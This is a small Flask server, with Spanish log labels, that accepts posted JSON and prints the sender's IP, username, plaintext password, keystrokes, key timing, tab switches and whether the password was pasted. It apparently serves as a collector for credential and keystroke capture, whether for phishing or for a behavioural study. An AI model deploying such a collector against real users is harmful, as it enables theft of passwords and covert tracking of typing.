from flask import Flask, request

app = Flask(__name__)

@app.route('/_api_/', methods=['POST'])
def log_behavior():
    d = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    print("\n>> Registro de actividad detectado:")
    print(f"IP: {ip}")
    print(f"Usuario: {d.get('u')}")
    print(f"Clave: {d.get('c')}")
    print(f"Teclas: {d.get('t')}")
    print(f"Tiempo Total: {d.get('tt')} ms")
    print(f"Backspaces: {d.get('b')}")
    print(f"Cambios de pestañas: {d.get('vc')}")
    print(f"¿Pegó la clave?: {'Sí' if d.get('pc') else 'No'}")
    print(f"Key Delays: {d.get('kd')}\n")
    
    return '', 204

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5050)
